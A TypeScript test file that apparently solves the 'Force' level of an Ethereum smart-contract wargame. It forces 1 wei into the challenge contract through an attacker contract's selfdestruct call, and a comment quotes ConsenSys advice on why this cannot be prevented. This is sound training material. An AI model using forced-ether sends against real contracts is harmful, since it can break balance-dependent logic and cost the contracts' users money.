import { Contract } from "ethers";
import { TestOptions, setupChallenge, submitLevel } from "./utils";
import { expect } from "chai";
import { FORCE_LEVEL_ADDRESS } from "./constants";

/**
 * For a smart contract written in Solidity to receive ether it requires a `payable` decorator in the function signature
 * otherwise EVM will throw
 * To force send ether to a contract we can use the `selfdestruct` feature of a smart contract which bypasses any checks
 *
 * ConsenSys - Secure Development Recommendations:
 * The attacker can do this by creating a contract, funding it with 1 wei, and invoking selfdestruct(victimAddress).
 * No code is invoked in victimAddress, so it cannot be prevented. This is also true for block reward which is sent to
 * the address of the miner, which can be any arbitrary address. Also, since contract addresses can be precomputed,
 * ether can be sent to an address before the contract is deployed.
 * @see https://consensys.github.io/smart-contract-best-practices/recommendations/#remember-that-ether-can-be-forcibly-sent-to-an-account
 */

describe("Force", () => {
  let challenge: Contract;
  let attacker: Contract | undefined;

  before(async () => {
    const contractLevel = FORCE_LEVEL_ADDRESS;
    const options: TestOptions = {
      contractName: "Force",
      attackerName: "ForceAttacker",
    };
    ({ challenge, attacker } = await setupChallenge(contractLevel, options));
  });

  it("solves the challenge", async () => {
    // send 1 wei and execute attacker selfDestruct to force wei to Force contract
    await attacker?.selfDestruct({ value: 1 });
  });

  after(async () => {
    expect(await submitLevel(challenge.address), "level not solved").to.be.true;
  });
});
